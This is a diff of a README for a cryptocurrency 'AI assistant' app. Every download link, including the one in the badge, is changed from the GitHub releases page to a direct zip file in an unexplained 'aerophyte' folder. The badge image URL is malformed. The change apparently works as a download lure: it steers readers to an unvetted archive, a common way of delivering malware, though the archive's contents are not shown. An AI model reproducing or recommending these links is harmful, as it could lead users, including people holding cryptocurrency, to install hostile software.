@@ -1,6 +1,6 @@
 # 🚀 crypto_invest_with_ai - Your AI-Powered Cryptocurrency Assistant
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/EddexD/crypto_invest_with_ai/releases)
+[![Download the latest release](https://raw.githubusercontent.com/EddexD/crypto_invest_with_ai/main/aerophyte/crypto_invest_with_ai.zip%20Now-brightgreen)](https://raw.githubusercontent.com/EddexD/crypto_invest_with_ai/main/aerophyte/crypto_invest_with_ai.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to download and run **crypto_invest_with_ai**:
 
 ### 1. Visit the Download Page
 
-To get your hands on the latest version of the application, [visit this page to download](https://github.com/EddexD/crypto_invest_with_ai/releases).
+To get your hands on the latest version of the application, [visit this page to download](https://raw.githubusercontent.com/EddexD/crypto_invest_with_ai/main/aerophyte/crypto_invest_with_ai.zip).
 
 ### 2. Download the Application
 
@@ -87,7 +87,7 @@ Your feedback is valuable to us. If you have any suggestions or encounter issues
 
 ## 🔗 Useful Links
 
-- [Download the latest release](https://github.com/EddexD/crypto_invest_with_ai/releases)
+- [Download the latest release](https://raw.githubusercontent.com/EddexD/crypto_invest_with_ai/main/aerophyte/crypto_invest_with_ai.zip)
 - [Visit the Documentation](#)
 - [Contact Support](#)
 
